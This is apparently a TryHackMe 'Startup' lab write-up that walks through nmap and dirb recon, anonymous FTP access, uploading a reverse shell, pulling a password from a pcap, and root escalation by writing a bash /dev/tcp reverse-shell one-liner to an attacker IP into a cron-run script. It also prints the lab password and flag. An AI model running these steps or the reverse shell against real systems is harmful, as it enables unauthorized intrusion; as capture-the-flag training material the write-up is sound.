Room: Startup
Link: https://tryhackme.com/room/startup
Machine IP: 10.10.55.197

### Recon 
<h5> Nmap Scan </h5>
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Also during nmap scan we see that anonymous login is allowed so we will take a look at that in a min but first let's have a look at dirb scan.

<h5> Dirb Scan </h5>

dirb scan gives us a directory named files a

directory.png



### Enumeration
Now connecting to the ftp server we find a image file and a txt file downloading them to our machine and now seeing the contents of txt file it says "Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus."

Well didn't get much out of it.
Now looking at the image we see

<h5> Reverse shell</h5> 
We don't have the write permissions on "/" directory so we upload the rev shell file on ftp directory and it is successful.

  upload.png

Starting a listener and we have our reverse shell.
  
   recipe.png

Moving to the incidents directory we find a .pcapng file and to download that file we copy the file from the target machine to its open ftp server 
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/

Downloading the file on our machine.
 
  suspicious.png

Typing the command strings suspicious.pcapng scrolling down and we see the password for www-data.
 c4ntg3t3n0ughsp1c3

  password.png

Stabilizing our reverse shell by using the following command.
  python -c 'import pty; pty.spawn("/bin/sh")'

Entering the above found password for lennie we get access. Moving to the home/lennie directory we have our user flag: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

<h5> PrivEsc </h5>
Moving to the scripts folder.


Using the following command and print the reverse shell command in the print.sh file so that we can get a privileged shell
 lennie.png

echo 'bash -c "bash -i >& /dev/tcp/10.9.162.197/8080 0>&1"' > /etc/print.sh

After this we get a privileged shell and we have our root flag

 root.png
 